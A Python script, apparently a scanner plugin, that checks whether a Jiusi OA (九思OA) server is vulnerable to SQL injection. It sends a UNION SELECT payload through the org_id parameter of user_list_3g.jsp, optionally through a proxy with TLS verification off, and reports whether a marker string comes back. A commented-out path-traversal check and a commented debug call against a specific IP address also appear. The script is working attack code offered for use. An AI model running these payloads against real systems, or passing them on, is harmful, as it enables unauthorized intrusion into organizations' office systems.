import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        gf = requests.get(url+'jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,%22test_test_test%22%20%23',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        #gf1 = requests.get(url + 'api/v1/cav/client/status/../../admin/options', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
        if gf.status_code == 200 and "test_test_test" in gf.text:
            uia = '[+]漏洞存在\njsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,%22test_test_test%22%20%23 '
        # elif gf1.status_code == 200 and "block-message" in gf1.text:
        #     uia = '[+]漏洞存在\napi/v1/cav/client/status/../../admin/options'
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('http://112.230.203.226:8001/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ 九思OA sql注入漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)